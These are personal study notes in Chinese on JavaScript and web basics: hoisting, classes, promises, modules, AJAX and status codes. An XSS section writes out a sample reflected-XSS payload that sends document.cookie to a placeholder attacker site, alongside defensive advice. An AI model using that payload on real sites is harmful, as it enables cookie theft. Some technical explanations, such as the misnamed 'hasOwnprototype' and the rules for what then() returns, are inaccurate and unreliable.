	 


	 1, 在声明中,函数第一个声明提示,然后再变量提升,若出现变量名与函数重名;
    则会因为函数声明提升而导致被变量重叠;
	
	 2, 函数中的形参在传入参数后会进行声明,即形成了局部作用域,相当于自声明了一个变量.
	
	 3, in 判断一个对象中是否拥有此属性 (字符串类型 'v ' ) 判断语句,不管是
        私有属性还是公有属性
	
	 4,  in 和 hasOwnprototype 相似, 但是hasOwnprototype 是检测某一个属性
	是否为对象的私有属性 (只允许私有属性)-- hasOwnprototype经常被用来检验!

	 5, 函数没有return 语句统统看成undefined

	 6, 在设置函数的形参默认值时, 默认申明形参为 let i 若设置的默认值与 i
	一致,则会造成暂时性死区报错;

	 7, parseInt(字符串, 进制 ) 如果进制中输入了值,就会将字符串按进制转化
 	为10进制 即 parseInt(11, 2) 会将11按二进制转化  1 * 2 + 1 * 1 结果为 3
	如果不符合进制的规则,则返回NaN
	
	 8,  instanceof使用方法   =>   obj instanceof Array  中间以空格隔开
	

	 9, 对象只要有合适的length属性, 也可以使用数组的slice 方法

	 10, class -理解: 就像是个直接定义的原型属性,在 class中定义的方法统统会
	放在其创建的实例对象的原型上, 但是,与其区别很大
			1, class 的 typeof 的属性为 function
			2, class 中定义方法时不需要加function 如:
				class NewObj{
					constructor () {
						this.x = x;
					}		
					hello(){
					        console.log("hello word");
					}
				}
		1, class是一个函数 function ()!!!!
		2, class使用方法与构造函数一致( var newObj = new Obj() );
		3, 在class中设置的方法是直接设置在原型中
		4, class中的方法 设置为 toString (){  }     -- 不带function
		5, 在class中需要设置 constructor 构造函数指向 

	

	注解:  
		class并不是一个原型或者一个函数,它更像一个集合, 更多的像在原型上操作

	但是,class本身并不是原型,他是一个构造函数,可以理解为外表为构造函数,内里为原型
	
	|
	|
	|

	11, 何为xss注入式攻击 - 利用xss漏洞进行数据窃取以及信息攻击等

		1, get命令的不严谨,
		2, 对于用户输入的转码,以及验证的疏忽
		3, 未实现攻击防御
		4, 未对用户身份进行判断
		5, 使用eval new function()此种二层代码解释引擎功能(大忌)

	常见攻击法:
		 1, ( 非持久型XSS ) 反射型XSS 

		      /* 在input中 */ 输入<script> location.href = "www.攻击者
    	        的网站.com? cookidDatas = document.cookie "</script> 

		      /*  点击url  */ www.test.com?keywords = <script> location
    .   	href = "www.攻击者的网站.com? cookidDatas = document.cookie "</script> 

			--此类钓鱼性质代码, 注:此类代码利用javascript的某些运行特性,
		 在用户误输入或访问此类攻击性行为时,会将用户的信息记录并且窃取

		 如何防范：


		1）只允许用户输入我们期望的数据。

		2）Web页面渲染的所有内容或者渲染的数据都必须来自于服务端，不要信任用户的输入内容。

		3）尽量不要使用eval, new Function()等可执行字符串的方法。
		
4）前端渲染的时候对任何的字段都需要做encode转义编码。
		
5）过滤或移除特殊的Html标签。
		
6）将重要的cookie标记为http only。



		作者：jefferyE
链接：https://juejin.im/post/5ca1bfd16fb9a05e1b3c5fe3
		
来源：掘金
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。
	   	
		

		2, (持久型XSS)

		/* 停留攻击 */ 若前端将攻击者的 <script>...</script> 或者SQL语句等等
		此类代码很容易造成蠕虫攻击,对网站的SQL数据进行窃取等等.

		如何防范：

		1）后端在入库前应该选择不相信任何前端数据，将所有的字段统一进行转义处理。
		2）后端在输出给前端数据统一进行转义处理。
		3）前端在渲染页面 DOM 的时候应该选择不相信任何后端数据，任何字段都需要做转义处理。
		


	如何抵御此类攻击呢?.

		1,最重要的一点! 永远不要相信用户输入的数据!!!!!!!!!!!!!!!!

		2,我们所获得的渲染数据必须从服务器传输!对于数据进行转码,加强表单验证.

		3,如何防范：对于一切用户的输入、输出、客户端的输出内容视为不可信，只
	   要是客户端提交的数据就应该先进行相应的过滤处理然后方可进行下一步的操作。
		
	12, ajax详解
			实例 var myRquest = new XMLHttpRequest();
				myRquest.open( "请求方式", "请求地址", async是否是异步 );

				如果是get请求 则不用设置请求头;	
				
				如果是post请求,就需要设置请求头: 

	-- myRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
					
					


	13, get 和 post   
		get与post的最大的区别就在于其传数据的方式不同:
			get 直接在URL中传递参数, 安全性不高,易被XSS攻击, 传递的参数有限, 只支持
		URL编码, 传输的参数统统是Ascll码, 浏览器回退时无害, 传递的url会被浏览器书签
		保存, get请求会被浏览器自动隐藏,不用设置请求头, 数据放在请求头的url中
			   结论,重要信息不要使用get ,由于get的不安全,对其要加强验证安全性;
				get简单,速度更快,传输效率更强大

			post 于请求体中传递参数, 需要设置请求头, 安全性较高,建议使用随机码对数据
		进行加密, 浏览器回退时会再次发送请求, post 不能被书签历史标记, 支持更多种类的编码
		格式 接受的参数没有限制

			   结论, 适用于文件信息传输, 安全性高,加上随机的状态吗加密可以抵御XSS等的攻击
		请求时,需要设置请求头-- setRequestHeader, 参数放在send中;

				无法使用缓存文件(更新服务器上的文件或数据库)
				向服务器发送大量数据(post没有数据量限制)
				发送包含未知字符的用户输入时, post比get更稳当也更可靠

 	14, 模板引擎: -注: 用法与 react 的 jsx 语法相似 ! ! !

	   用法:
		1,引入模板引擎的js文件 -- <script src = " template-native.js "> </script>
		
		2, 获取到需要展示在页面的真实数据, 一般通过 AJAX 请求接口获取需要展示的数据
	// 然后将数据填入到页面中, 创建一个对象设置需要展示的标题和文字内容

		3, 创建一个模板来填写展示数据 - <script type=" text/template"> 
	// type 这是属性必须要设置,设置的原因就是不要让script标签中的内容默认为js代码执行
		
		
		4, 将模板需要生成的html结构拷贝到script标签中
		
		5, 调用template 函数 结合模板和数据生产最终的html代码片段
			// 第一个参数是模板id;
			//   第二个参数是数据对象;
			//     	template的返回值就是生成的html代码片段;
	     语法:
		 <%  %>  将我们需要执行的js代码在中间, 写法与jsx相似 /* 注释也需要*/
			输出表达式:
				<% =content %> 编码输出 (可以抵御XSS攻击, -阅读11节-)
				<% =#content %> 不编码输出 (XSS攻击正是利用此类功能进行攻击)
		{{  }}  我们将内容写在中间, 写法与PHP相似,其中  each arr as k v 代表for循环
	  	  
		template函数的用法:
			template( "创建的模板ID", 参数对象); 
			 在模板中不能访问到参数对象, 只能访问参数对象中的成员
			  如果是数组,也需要用个对象包起来;


	15, HTML元素默认允许进行跨域访问,其中JSONP就是利用script的src属性向跨域的服务器发送请求
                默认get请求--- script请求后台,后台会传递一组数据,然后script会将此数据已javaScript格式解析
		jsonp数据格式原理就是利用后台返回一个函数调用来实现数据传递;
	
	16, ...  拓展运算符,可以拆分对象,数组. (与rest参数同理,几乎一致)
	    如  ...[1,5,6,87,98] //拆分为 1,5,6,87,98
	
	
	17, 箭头函数, 返回值如果只有一行,就可以省略大括号,如果有大括号,那么需要返回值时必须要加return语句
		- 箭头函数没有this, 它的this指向从作用域中获取, 在settimeout..计时器中,箭头函数的this指向都指向 外层函数

	18, Map --- es6 新语法,  可以使用对象作为键名, 


	19,状态码:

		客户端错误代码:

	4++ , 一般4开头的状态码就是请求错误问题
		如:
		  400 Bad Request 请求体包含语法错误
		  401 Unauthorized 需要验证用户身份,如果服务器就算是身份验证后也不允许客户访问资源, 应该响应 403 Forbidden
		  403 Forbidden 服务器拒绝执行
		  404 Not Found 找不到目标资源
		  405 Method Not Allowed 不允许执行目标方法,响应中应该带有 Allow 头, 内容为该资源有效的HTTP方法
		  406....
	
		服务端错误:
	
	5++ ,一般5开头的状态码就是服务器端错误:
	
	500: 服务器遇到 Bug ,无法处理请求
	501: 服务器不支持当前请求所需要的某个功能
	503: 服务器过载, 进入排队等待状态

	501 与 405 的区别: 405代表服务端不允许客户端这么做,
501 是表示客户端或许可以这样做,但是服务端还不能实现这个功能

	20, promise 异步对象:	--( 承诺对象,保证会完成 )
		简单案例:
	var pro = new Promise( function(resolve, reject ){
		
		// 这里可以放一写代码,根据测验,在这里设置计时器并不会有什么其他的特殊事件,计时器依然按照事件栈运行,所以可以把这个对象看成一段与其他代码一起运行的特殊函数就可以
		
	resolve --- 承诺达成: 
	reject  --- 承诺失败: 抛出错误 -  
		} )
	在promise中, 如果使用throw 抛出错误会直接结束异步运行
	
	 我们只有在异步对象promise状态改变时才能结束;所以切记切记,必须设置出口: - resolve 和 reject 
	resolve 和 reject   是系统自动生产的一个函数,我们通过传参到promise的函数参数中进行调用 
	这个内置函数参数的名字可以随意取名; 
	使用promise时请注意: 1, 出入口, 我们无法随时监视promise的执行状态,只能根据他的结束结果来判断,
			     2, promise主要来作为嵌套函数的语法糖使用,自身并无特别的用途,

	promise.then() 方法; 
	 promise( 成功函数()  , 失败函数() )
	then()方法返回的是一个新的promise对象

	理解:  promise 
		- 一个异步的对象,和其他代码同时进行运行,一般用来发送ajax的回调
		这个对象里可以设置一个函数,系统会自己传递两个函数参数 resolve 和 reject 进去 
	- 注: 如果设置的不是一个函数则会报错;
	 我们可以在这个函数里做一大堆的操作, 直到我们使用系统传入的这俩个默认参数(也是一个回调函数) 则会截止运行, 对象的状态被永久性改变
	- 注, 这俩个参数就是then里面的俩个参数,相当于调用这个参数后,对象被改变,函数终止运行, 进入到这两个参数的运行中
	 promise状态修改并且进入成功或者失败的函数操作中:

		asyncobj.then(成功函数, 失败函数);

	我们在设置成功或失败函数时,其实就是在修改对象修改状态后接下来的一步需要干什么: 

	 then 方法会返回一个新的promise对象, 如果成功函数或者失败函数有返回值,则这个异步对象的状态就是 resolve

	且对象的值就是这个返回值, 如果没有返回值,则这个对象的状态就是 reject;

	如果我们返回的是一个 新的promise对象 ,则就将这个新的promise对象返回; 
	
		-- 注: 无论如何我们的then方法返回的永远是一个promise,所以我们只要看见then方法就知道这个肯定是一个promise
	
	  附: throw 语句会结束代码且改变状态为reject,所以,千万不要在promise轻易使用,否则他会无法结束,状态一个保持在pending,后续代码会一直等待

	
	附 API :
		promise.all( [*, *, *] ) 等数组中所有的promise对象全都结束后,如果有一个失败就返回一个失败的promise对象, 全部成功才返回一个resolve的promise对象

		promise.race( [*, *, *] )将数组中所有的promise对象进行比赛,谁先跑完就返回谁的参数,并且接受它的状态
		promise.resolve() 将现有对象转化为promise对象,
			-- 1, 参数是promise实例, 原封不动的返回
			-- 2, 参数是一个有then方法的对象,会将这个对象转化为promise对象,然后立即执行then方法
			-- 3, 参数是常规值, 返回一个新的promise对象,并且将其状态设置为resolved, 
			-- 4, 不带参数, 返回一个空的完成状态(resolve)的promise对象


		promise.reject 与promise.resolve用法相似,只不过状态设置为 reject
	
		promise.done() 在最后一个回调的尾端加,可以保证抛出任何可能出现的错误
	

		promise.finally() 不论状态如何,都会执行的操作,接收一个普通的回调函数作为参数,该函数一定会执行



	21, 冒泡事件和捕获事件:  --事件流
	
	1, 按照从大到小的级别进行触发, 到达事件目标时, 事件目标执行自身的事件流, 然后在冒泡到外层
	2,  事件流存储机制, 事件栈从栈底插入, 栈顶获取 先到先得;
		

	22, 在严格模式下, 全局函数的指向默认为undefined

	23, 在es6之前, 社区指定里一套规范
		Commonjs  主要服务端
		AMD        requireJs curljs
		CMD        seaJs
	
	  推出es6后, 统一了服务端和客户端的模块化规范
		import {xxx} ddd
		
	模块化:  - 必须要在服务器环境下运行

		a) 如何定义模块
			export 导出的模块  
			export defalut 默认导出的模块


		b) 如何使用模块

	 		import 导入模块文件
			import {变量} from "模块路径"

	 	使用模块 例如:
		<script type="module"> 

			import "./js/module.js"

		-- 如果后缀是.js 则可以不用加后缀
		-- 这样直接引入文件路径,相当于引入这个文件	
		
		import {变量} from " *** 路径***"

 
		</script>

	import:  -- 静态引入
	    1)  import可以是相对路径也可以是绝对路径
	    2)	重复引用也只会加载一遍
	    3)	import "./js/module.js"
		  -- 这样直接引入文件路径,相当于引入这个文件
	    4)  可以使用别名 export{ obj as obj123 }j123
			- 相当于被obj的名字改为obj123
		 export * as modoTwo from  "***"
		 导出了所有的东西
	    5)  只有在export default 默认导出的模块才能不用加花括号, 剩下的必须都需要加花括号
	    6)  import 会进行变量提升;
	    7)  导出去的模块内容,如果里面有定时器更改,外卖也会改动,不想Common 规范缓存
	    8)   引入模块是静态的,不允许写到判断的逻辑语言里面 不能写在if 语句里
	

	import():  -- 类似node里面的require, 可以动态引用

		采用的promise规范
    例如:
	import(" ./*** ").then( ()=> { console.log( a,b ) } )

	返回值是一个promise对象:
  Promise.all( [import(***), import(***), import(***), import(***), import(***) ]  ).then( (res )=> { }  )
	
		优点:  
			1,按需加载,
			2,可以写在 if 的判断语句中
			3, 路径也可以动态更改 

		和async await 异步函数配合 可以很好的解决导入问题
		( async function(){
			const mod1 = await import("./modules/1.js")
			const mod2 = await import("./modules/1.js")
			const[m1, m2] = await Promise.all([
 import("./modules/1.js"), import("./modules/2.js")])
			
		} )()

	模块化默认为严格模式
	严格模式未来会成为标准

	附注: 
		在全局引用时 - 不能使用模块的变量,这相当于一个闭包条件; 
		在局部引用时, 需要接收参数才能使用

	模块引用时,都会执行模块中的代码

		
	24, interator接口 --
	解释:  为可遍历数据结构设计的一个接口:
		-在 数组, 字符串,argument, 伪数组, NodeList, set, map  都配备了原生的 interator接口

	原理: 底层是一个类似于迭代器的遍历机制, 每一次调用就会将其指针指向第二个参数地址. 与generator函数有很大的相似, 

	像 ... 拓展运算符, for of  都采用了此interator


	拓展   for( var [k, v] of  map ){

	// 这里如果使用一个变量  如 for( var out of map )

	// 那么 这个 out 变量会是一个map的键值对数组例如:
	//    [ "key", "value"]
		

		console.log ( k + " : " + v );
		
		// 这里因为for  of 将指针指向的map对象中的元组, 所以我们可以用解构赋值一次性提取 k 与 v
	}

	

	25,  generrator 函数 
		
		function* fn(){
		
	}


	26,  对象的一些方法:
	
	    Object.keys( obj ) 将obj对象的所有键名提取到一个数组中  (省略 enumerable 为 false 的属性)

	    for ... in  遍历对象自身的和可继承的可枚举的属性
	    JSON.stringify  只串行化对象自身的可枚举的属性

	    Object.assign   浅拷贝对象的数据 将后者对所有属性拷贝到前者
	     
	    [12, 56, 48].find( () => {true or false } ) 返回第一个判断结果为true的元素	
	
	27,  startsWith 检验字符串开头是否有符合规则的字符串
		例:  str.startsWith("用来检测的字符串")
	用来判断字符串,是否是指定的字符开头,如果是,返回true, 否则就返回false